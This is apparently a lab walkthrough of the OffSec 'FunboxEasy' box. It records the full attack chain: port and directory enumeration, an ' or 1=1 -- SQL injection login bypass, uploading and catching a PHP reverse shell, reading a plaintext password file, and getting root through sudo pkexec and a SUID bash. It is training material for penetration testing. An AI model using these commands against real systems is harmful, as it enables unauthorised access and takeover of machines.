# Recon

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasy# nmap -Pn -sT -sV -n 192.168.69.111 --min-rate 1000 --max-retries 2 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-01 15:05 CST
Nmap scan report for 192.168.69.111
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasy# nmap -Pn -sT -sV -n 192.168.69.111 -p- --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-01 15:06 CST
Warning: 192.168.69.111 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.69.111
Host is up (0.10s latency).
Not shown: 64490 closed ports, 1042 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.42 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasy# nmap -Pn -sT -sV -sC -n 192.168.69.111 -p 22,80,33060 --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-01 15:14 CST
Nmap scan report for 192.168.69.111
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.22 seconds
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasy# nmap -Pn -sT -sV --script http-enum -n 192.168.69.111 -p 80 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-01 15:16 CST
Nmap scan report for 192.168.69.111
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /robots.txt: Robots file
|   /secret/: Potentially interesting folder
|_  /store/: Potentially interesting folder
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/2.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/3.png)


```console
root@kali:/OSCPv3/offsec_pg/FunboxEasy# python3 /opt/dirsearch/dirsearch.py -u http://192.168.69.111 -e .php,.txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: .php, .txt | HTTP method: get | Threads: 10 | Wordlist size: 6518

Error Log: /opt/dirsearch/logs/errors-21-11-01_15-28-53.log

Target: http://192.168.69.111

[15:28:54] Starting: 
[15:29:05] 301 -  316B  - /admin  ->  http://192.168.69.111/admin/
[15:29:06] 200 -    3KB - /admin/
[15:29:06] 200 -    3KB - /admin/?/login
[15:29:07] 200 -    3KB - /admin/index.php
[15:29:07] 302 -   24KB - /admin/home.php  ->  http://192.168.69.111/admin/index.php
[15:29:23] 200 -    0B  - /checklogin.php
[15:29:37] 200 -   11KB - /index.html
[15:29:37] 200 -    3KB - /index.php
[15:29:37] 200 -    3KB - /index.php/login/
[15:29:54] 200 -   14B  - /robots.txt
[15:29:55] 301 -  317B  - /secret  ->  http://192.168.69.111/secret/
[15:29:55] 200 -  108B  - /secret/
[15:29:59] 301 -  316B  - /store  ->  http://192.168.69.111/store/

Task Completed
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/4.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/5.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/6.png)

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasy# python3 /opt/dirsearch/dirsearch.py -u http://192.168.69.111/store -e .php,.txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: .php, .txt | HTTP method: get | Threads: 10 | Wordlist size: 6518

Error Log: /opt/dirsearch/logs/errors-21-11-01_15-34-37.log

Target: http://192.168.69.111/store

[15:34:38] Starting: 
[15:34:40] 200 -   66B  - /store/.gitattributes
[15:34:49] 200 -    3KB - /store/admin.php
[15:35:11] 301 -  325B  - /store/database  ->  http://192.168.69.111/store/database/
[15:35:12] 200 -    1KB - /store/database/
[15:35:17] 301 -  326B  - /store/functions  ->  http://192.168.69.111/store/functions/
[15:35:17] 200 -    1KB - /store/functions/
[15:35:21] 200 -    4KB - /store/index.php/login/
[15:35:21] 200 -    4KB - /store/index.php
[15:35:37] 200 -  116B  - /store/README.md
[15:35:45] 301 -  325B  - /store/template  ->  http://192.168.69.111/store/template/
[15:35:45] 200 -    1KB - /store/template/

Task Completed
root@kali:/OSCPv3/offsec_pg/FunboxEasy# 
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/11.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/12.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/13.png)


```console

root@kali:/OSCPv3/offsec_pg/FunboxEasy# searchsploit Small CRM
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Small CRM 2.0 - Authentication Bypass                                                                         | php/webapps/47874.txt
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
root@kali:/OSCPv3/offsec_pg/FunboxEasy# searchsploit -x 47874
```
https://www.exploit-db.com/exploits/47874

SQL injection: ' or 1=1 -- 

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/15.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/16.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/17.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/18.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/19.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/20.png)

Default pwd

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/8.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/9.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/21.png)

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasy# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2021-11-01 16:29:04--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.111.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5491 (5,4K) [text/plain]
Grabando a: “php-reverse-shell.php”

php-reverse-shell.php               100%[===================================================================>]   5,36K  --.-KB/s    en 0,001s  

2021-11-01 16:29:09 (8,38 MB/s) - “php-reverse-shell.php” guardado [5491/5491]

root@kali:/OSCPv3/offsec_pg/FunboxEasy# nano php-reverse-shell.php 
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/23.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/24.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/25.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/26.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/27.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/28.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/29.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasy/img/30.png)


```console
root@kali:/OSCPv3/offsec_pg/FunboxEasy# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.69] from (UNKNOWN) [192.168.69.111] 38816
Linux funbox3 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:42:03 up  1:41,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@funbox3:/$ ^Z
[1]+  Detenido                nc -lvnp 80
root@kali:/OSCPv3/offsec_pg/FunboxEasy# stty raw -echo
root@kali:/OSCPv3/offsec_pg/FunboxEasy# nc -lvnp 80
                                                   reset

www-data@funbox3:/$ export TERM=xterm
www-data@funbox3:/$ export SHELL=bash
www-data@funbox3:/$ stty rows 36 columns 144
```

```console
www-data@funbox3:/home$ cd tony/
www-data@funbox3:/home/tony$ ls
password.txt
www-data@funbox3:/home/tony$ cat password.txt 
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
www-data@funbox3:/home/tony$ ls -la
total 24
drwxr-xr-x 2 tony tony 4096 Oct 30  2020 .
drwxr-xr-x 3 root root 4096 Jul 30  2020 ..
-rw------- 1 tony tony    0 Oct 30  2020 .bash_history
-rw-r--r-- 1 tony tony  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 tony tony 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 tony tony  807 Feb 25  2020 .profile
-rw-rw-r-- 1 tony tony   70 Jul 31  2020 password.txt
```

```console
www-data@funbox3:/var/www$ cat local.txt 
ee15b49a4eec8f58e6be308d039aa98c
```

```console
root@kali:/OSCPv3/offsec_pg/FunboxEasy# ssh tony@192.168.69.111
The authenticity of host '192.168.69.111 (192.168.69.111)' can't be established.
ECDSA key fingerprint is SHA256:lDqW7tOK4ZCIRla+OSX6KVPDsRFL04w865Q2Q7MR7+k.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.69.111' (ECDSA) to the list of known hosts.
tony@192.168.69.111's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Nov  1 22:51:47 UTC 2021

  System load:  0.01              Processes:               158
  Usage of /:   77.4% of 4.66GB   Users logged in:         0
  Memory usage: 60%               IPv4 address for ens256: 192.168.69.111
  Swap usage:   0%


60 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tony@funbox3:~$ 
```

```console
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

https://gtfobins.github.io/

```console
tony@funbox3:~$ sudo /usr/bin/pkexec /bin/sh
#whoami
root
# 
```

Review time command


```console
#cat proof.txt
d46c81ed105cf4f1876b108284744af8
# 
```

```console
tony@funbox3:~$ sudo /usr/bin/pkexec chmod u+s /bin/bash
tony@funbox3:~$ bash -p
bash-5.0# whoami
root
```

References

https://gtfobins.github.io/

https://book.hacktricks.xyz/linux-unix/privilege-escalation

https://netsec.ws/?p=337

https://github.com/carlospolop/hacktricks/tree/master/linux-unix/privilege-escalation

https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html

https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration
